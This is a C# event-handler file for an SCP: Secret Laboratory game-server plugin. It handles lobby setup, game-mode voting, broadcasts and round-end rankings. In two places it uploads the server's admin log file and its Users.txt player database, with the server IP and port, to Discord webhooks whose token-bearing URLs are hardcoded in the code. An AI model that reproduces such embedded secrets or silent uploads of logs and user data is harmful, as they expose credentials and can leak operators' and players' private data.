using DiscordInteraction.Discord;
using Exiled.API.Enums;
using Exiled.API.Extensions;
using Exiled.API.Features;
using Exiled.Events.EventArgs.Server;
using GPUtils.Features.PaintToText.Core;
using InventorySystem.Configs;
using InventorySystem.Items.Usables.Scp330;
using MapGeneration.Holidays;
using MEC;
using MultiBroadcast.API;
using PlayerRoles;
using ProjectMER.Features;
using Respawning;
using RGM.API.Components;
using RGM.API.DataBases;
using RGM.API.Features;
using RGM.Modes;
using RGM.Modes.Sets.AddScp.Scps;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using UnityEngine;
using static RGM.IEnumerators.LobbyIEnumerator;
using static RGM.IEnumerators.ServerIEnumerator;
using static RGM.Variables.Variable;

namespace RGM.EventArgs
{
    public static class ServerEvents
    {
        public static IEnumerator<float> OnWaitingForPlayers()
        {
            Server.Name = Server.Name.Replace("{version}", $"v{RGM.Instance.Version.Major}.{RGM.Instance.Version.Minor}.{RGM.Instance.Version.Build}");

            yield return Timing.WaitForSeconds(1f);

            try
            {
                var folderPath = $"{Paths.AppData}/SCP Secret Laboratory/LocalAdminLogs/{Server.Port}/";
                var files = new DirectoryInfo(folderPath)
                            .GetFiles()
                            .OrderByDescending(f => f.CreationTime)
                            .ToList();

                if (files.Count >= 2)
                {
                    FileInfo secondOldest = files[1];
                    string content = File.ReadAllText(secondOldest.FullName);

                    Webhook.Send($"LocalAdminLogs : {Server.Port}", "https://discord.com/api/webhooks/1455192596291911882/xDadWWo7IJmno_mMnOySwZ4sPxyIMIGZLwYOFi_SGk-AUhB3lqQG9ElvQYWpj5-iFnLK", $"{secondOldest.FullName}");
                }
            }
            catch (Exception e)
            {
                Log.Error($"Error sending LocalAdminLogs webhook: {e}");
            }

            Server.ExecuteCommand("rnr");

            InventoryLimits.StandardCategoryLimits[ItemCategory.SpecialWeapon] = 8;
            InventoryLimits.StandardCategoryLimits[ItemCategory.SCPItem] = 8;
            InventoryLimits.Config.RefreshCategoryLimits();

            foreach (var data in CandyDataDict)
            {
                Scp330Candies.DictionarizedCandies.Add(data.Key, data.Value);
            }

            UsersManager.LoadUsers();

            GlobalPlayer = AudioPlayer.CreateOrGet($"Global AudioPlayer", condition: (ReferenceHub hub) =>
            {
                return !MuteBGMPlayers.Contains(Player.Get(hub));
            }, onIntialCreation: (p) =>
            {
                Speaker speaker = p.AddSpeaker("Main", isSpatial: false, maxDistance: 5000);
            });

            Tools.PlayGlobalAudio("Escape the Backrooms OST - Menu", 1.5f, true);

            Round.IsLobbyLocked = true;
            GameObject.Find("StartRound").transform.localScale = Vector3.zero;
            Tools.LoadMap($"RGMLobby");
            Tools.LoadMap($"RGMBase");

            var donator = new Donator.Main();
            donator.OnEnabled();

            yield return Timing.WaitForSeconds(1);

            First = Tools.GetObjectList("First");
            Second = Tools.GetObjectList("Second");
            Third = Tools.GetObjectList("Third");
            Fourth = Tools.GetObjectList("Fourth");
            Numbers = Tools.GetObjectList("Number");
            RandomColors = Tools.GetObjectList("RandomColor");
            RandomLights = Tools.GetObjectList("RandomLight");
            Balls = Tools.GetObjectList("Ball");

            yield return Timing.WaitForSeconds(1);

            Tools.PickModes();
            Balls.ForEach(x => x.gameObject.AddComponent<BallComponent>());

            Timing.RunCoroutine(SyncSpectatedHint());
            Timing.RunCoroutine(ThrowawayBroadcast());
            Timing.RunCoroutine(GameStartButton());
            Timing.RunCoroutine(ModeResetButton());
            Timing.RunCoroutine(IsFallDown());
            Timing.RunCoroutine(InputCooldown());
            Timing.RunCoroutine(Ball());
            Timing.RunCoroutine(RenewalPlayersInfo());
            Timing.RunCoroutine(MovingShootingTarget());
            Timing.RunCoroutine(HintManager.OnStarted());
            Timing.RunCoroutine(HintManager.RemoveHint());
            Timing.RunCoroutine(ChatManager.RunChat());

            int rn = UnityEngine.Random.Range(1, 6);

            if (rn == 1)
            {
                SelectMode = "RandomSelect";
                Timing.RunCoroutine(RandomSelectMode());
            }
            else if (rn == 2)
            {
                SelectMode = "SimpleSelect";
            }
            else if (rn == 3)
            {
                SelectMode = "SecretVote";
            }
            else if (rn == 4)
            {
                SelectMode = "FightVote";

                Server.FriendlyFire = true;
            }
            else
            {
                SelectMode = "MostVote";
            }

            while (true)
            {
                UsersManager.LoadUsers();

                yield return Timing.WaitForSeconds(1f);
            }
        }

        public static IEnumerator<float> OnRoundStarted()
        {
            Server.FriendlyFire = false;

            MapUtils.UnloadMap("RGMLobby");
            Server.ExecuteCommand($"/speak {string.Join(".", PlayerManager.List.Select(x => x.Id))}. 0");
            IntercomPlayers.Clear();
            EnabledModeList.Clear();

            if (AudioPlayer.TryGet("Global AudioPlayer", out AudioPlayer ap))
                ap.RemoveAllClips();

            Tools.CreateText(new Vector3(231.1433f, 368.6755f, -43.0956f), new Quaternion(0, 90, 0, 90), "<size=100><b><color=#FFF0F0>[</color><color=#FEEAF1>R</color><color=#FDE5F2>G</color><color=#FDDFF3>M</color><color=#FCDAF4>]</color> <color=#FBCFF6>랜</color><color=#FBC9F7>덤</color><color=#FAC4F8>게</color><color=#FABEF9>임</color><color=#F9B9FA>모</color><color=#F9B3FB>드</color></b><color=#F8AEFC>에</color> <color=#F2A9F7>오</color><color=#ECA9F1>신</color> <color=#E0A9E4>것</color><color=#DAA9DE>을</color> <color=#CEAAD1>환</color><color=#C8AACA>영</color><color=#C2AAC4>합</color><color=#BCAABE>니</color><color=#B6AAB7>다</color><color=#B0AAB1>!</color></size>", 12051205);

            if (CurrentMode == ModeType.None)
            {
                try
                {
                    var maxLength = ModeVote.Values.Max(list => list.Count);
                    var longestKeys = ModeVote.Keys.Where(key => ModeVote[key].Count == maxLength).ToList();
                    var randomKey = longestKeys[UnityEngine.Random.Range(0, longestKeys.Count)];
                    CurrentMode = randomKey;
                    CurrentSubMode = SubModeVote[ModeVote.Keys.ToList().IndexOf(randomKey)];

                    if (SelectMode == "SimpleSelect")
                    {
                        List<Player> mergedPlayers = ModeVote.Values.SelectMany(x => x).ToList();
                        List<Player> filiteredPlayers = mergedPlayers.Where(mergedPlayers.Contains).ToList();

                        if (filiteredPlayers.Count > 0)
                        {
                            Player player = Tools.GetRandomValue(filiteredPlayers);
                            CurrentMode = ModeVote.FirstOrDefault(x => x.Value.Contains(player)).Key;
                            CurrentSubMode = SubModeVote[ModeVote.Keys.ToList().IndexOf(CurrentMode)];

                            Timing.CallDelayed(1f, () =>
                            {
                                foreach (var p in PlayerManager.List)
                                    p.AddBroadcast(10, $"<size=25><b>롤토체스 당첨자({player.DisplayNickname})</b>에 의해 모드가 {CurrentMode.GetModeData().Name}(으)로 선택되었습니다.</size>");
                            });
                        }
                    }
                }
                finally
                {
                    if (!ModeList.ContainsKey(CurrentMode))
                    {
                        CurrentMode = Tools.GetRandomValue(ModeList.Keys.Where(x => ModeList[x].Category == ModeCategory.Public).ToList());

                        foreach (var p in PlayerManager.List)
                            p.AddBroadcast(10, $"<size=25><b>알 수 없는 이유로 모드가 선택되지 않았으므로, 모드가 랜덤으로 선택되었습니다.</size>");
                    }
                }
            }

            Server.Name = Server.Name.Replace("[라운드 시작 전 로비]", $"[현재 모드: <color=#{CurrentMode.GetModeData().Color}>{CurrentMode.GetModeData().Name}</color>{(CurrentSubMode == ModeType.None ? "" : $"<size=25> + <color=#{CurrentSubMode.GetModeData().Color}>{CurrentSubMode.GetModeData().Name}</color></size>")}]");

            List<string> ModeDesc = Tools.GetModeDesc(CurrentMode, CurrentSubMode);

            foreach (var player in PlayerManager.List)
            {
                player.AddBroadcast(10, ModeDesc[0]);

                player.SendConsoleMessage($"\n{ModeDesc[0].Replace("\n", "\n")}", "white");
                if (ModeDesc[3] == "")
                    player.SendConsoleMessage($"\n{ModeDesc[2]}", "white");

                else
                    player.SendConsoleMessage($"\n{ModeDesc[3]}", "white");
            }

            Tools.TryInstallMode(CurrentMode);

            if (CurrentSubMode != ModeType.None)
                Tools.TryInstallMode(CurrentSubMode);

            if (StartupRandom == 3)
                Tools.CallSnakeHand(null, PlayerManager.List.Where(x => x.Role == RoleTypeId.FacilityGuard).ToList());

            Timing.RunCoroutine(Detonation());

            Webhook.Send($"시작된 모드 : {CurrentMode.GetModeData().Name}");
            Log.Info($"시작된 모드 : {CurrentMode.GetModeData().Name}");

            if (CurrentMode != ModeType.Develop)
            {
                if (CurrentMode.GetModeData().Info == ModeInfo.Plus)
                {
                    Timing.RunCoroutine(HumanLoop());
                    Timing.RunCoroutine(Scp079Broadcast());

                    int num = UnityEngine.Random.Range(1, 11);

                    if (num == 1)
                    {
                        foreach (var special in Specials)
                        {
                            if (UnityEngine.Random.Range(1, 4) == 1)
                            {
                                Tools.LoadMap(special);
                            }
                        }

                        if (UnityEngine.Random.Range(1, 3) == 1)
                            Scp294.OnEnabled();

                        if (UnityEngine.Random.Range(1, 3) == 1)
                            Scp1162.OnEnabled();
                    }
                }

                yield return Timing.WaitForSeconds(20 * 60);

                if (!Warhead.IsDetonated && CurrentMode.GetModeData().Type != ModeType.Develop)
                {
                    DeadmanSwitch.StartWarhead();

                    Exiled.API.Features.Cassie.MessageTranslated("", $"<color=red>예정된 시설 자폭 프로세스가 시작되었습니다.</color> <b>대피하십시오.</b>");
                }
            }
        }

        public static IEnumerator<float> OnRoundEnded(RoundEndedEventArgs ev)
        {
            if (HolidayUtils.IsHolidayActive(HolidayType.Halloween))
            {
                if (UnityEngine.Random.Range(1, 6) == 1)
                {
                    List<EffectType> effects = new()
                    {
                        EffectType.Metal,
                        EffectType.Lightweight,
                        EffectType.MovementBoost,
                        EffectType.SugarRush
                    };

                    foreach (var player in PlayerManager.List)
                    {
                        foreach (var effect in effects)
                        {
                            player.AddEffect(effect, 255);
                        }
                    }
                }
                else
                {
                    List<EffectType> effects = new()
                    {
                        EffectType.Spicy,
                        EffectType.OrangeCandy,
                        EffectType.SugarCrave,
                        EffectType.SugarHigh,
                        EffectType.SugarRush,
                        EffectType.Ghostly,
                        EffectType.Prismatic,
                        EffectType.WhiteCandy,
                        EffectType.Metal
                    };
                    var effect = effects.GetRandomValue();

                    foreach (var player in PlayerManager.List)
                    {
                        player.AddEffect(effect, 255);
                    }
                }
            }

            if (CurrentMode.GetModeData().Info == ModeInfo.Plus)
            {
                IEnumerable<Player> players = PlayerManager.List.Where(x => x.IsAlive && !x.IsNPC);

                if (players.Count() == 1)
                    Timing.RunCoroutine(Tools.SetWinner(players.ToList(), 5));

                else if (players.Count() > 1)
                    Timing.RunCoroutine(Tools.SetWinner(players.ToList(), 1));
            }

            Tools.TryInstallMode(ModeType.FriendlyFire);

            foreach (var player in Player.List)
            {
                Server.ExecuteCommand($"/speak {player.Id} 1");
                IntercomPlayers.Add(player);
            }

            foreach (var player in Player.List)
            {
                List<string> uc = UsersManager.UsersCache[player.UserId];

                if (uc[22] != "0")
                {
                    if (UnityEngine.Random.Range(1, 21) == 1)
                    {
                        uc[22] = "0";
                        UsersManager.UsersCache[player.UserId] = uc;
                        UsersManager.SaveUsers();

                        player.AddHint($"경고 해제", "부여된 경고가 해제되었습니다. 행운을 빕니다.", 20);
                    }
                }
            }

            try
            {
                string path = $"{Paths.Configs}/RGM/Users.txt";

                if (File.Exists(path) && new FileInfo(path).Length == 0)
                {
                    string tmpPath = path + ".tmp";
                    if (File.Exists(tmpPath))
                    {
                        File.Delete(path);
                        File.Move(tmpPath, path);
                    }
                }

                Webhook.Send($"# {Server.IpAddress}:{Server.Port}", "https://discord.com/api/webhooks/1373673172401913928/MKZROq8z9OjuGn21Oj8yjuTMHamSf8Z_VGE5BBebFO9c_WFvD9KphmcN2wZucC2cczLS", path);
            }
            catch (Exception e)
            {
                Log.Error($"Error sending webhook: {e}");
            }

            while (true)
            {
                var top10 = PlayersReport
                .OrderByDescending(kv => kv.Value.Damage)
                .Take(10)
                .ToList();

                StringBuilder sb = new StringBuilder();
                sb.AppendLine($"<size=30><b>이번 라운드 TOP 10</b></size>");
                int rank = 1;

                string ranking(int r)
                {
                    if (r == 1)
                        return "fffa66";
                    else if (r == 2)
                        return "808d8e";
                    else if (r == 3)
                        return "dfae4d";
                    else
                        return "ffffff";
                }

                foreach (var kv in top10)
                {
                    try
                    {
                        var userId = kv.Key;
                        var report = kv.Value;

                        Player player = null;
                        bool found = false;
                        try
                        {
                            found = Player.TryGet(userId, out player);
                        }
                        catch (Exception e)
                        {
                            Log.Error($"Player.TryGet 예외: {e}");
                        }

                        if (found && player != null)
                        {
                            sb.AppendLine($"<size=25><color=#{ranking(rank)}>{rank}.</color> {Tools.BadgeFormat(player)}<color={player.Role.Color.ToHex()}>{player.DisplayNickname}</color> - {report.Kill}킬 / {report.Death}데스 / {report.Damage}뎀</size>");
                        }
                        else
                        {
                            sb.AppendLine($"<size=25><color=#{ranking(rank)}>{rank}.</color> <color=#888888>알 수 없음</color> - {report.Kill}킬 / {report.Death}데스 / {report.Damage}뎀</size>");
                        }
                        rank++;
                    }
                    catch (Exception e)
                    {
                        Log.Error($"Error in generating round summary: {e}");
                    }
                }

                foreach (var player in Player.List)
                {
                    try
                    {
                        var report = PlayersReport[player.UserId];
                        string text = $"<align=left><size=20>{player.DisplayNickname} - {report.Kill}킬 / {report.Death}데스 / {report.Damage}뎀</size></align>\n<align=left>{sb}</align>\n\n\n\n";
                        player.ShowHint($"{WinMessage}\n\n{text}", 1.2f);
                    }
                    catch (Exception e)
                    {
                        Log.Error($"Error in AddHint: {e}");
                    }
                }

                yield return Timing.WaitForSeconds(1);
            }
        }

        public static void OnRespawnedTeam(RespawnedTeamEventArgs ev)
        {
            if (HolidayUtils.IsHolidayActive(HolidayType.Christmas) && UnityEngine.Random.Range(0, 100) < 10)
            {
                foreach (var player in ev.Players)
                {
                    player.Role.Set(ev.Wave.TargetFaction == Faction.FoundationStaff ? RoleTypeId.NtfFlamingo : RoleTypeId.ChaosFlamingo, RoleSpawnFlags.AssignInventory);
                }
            }
        }
    }
}
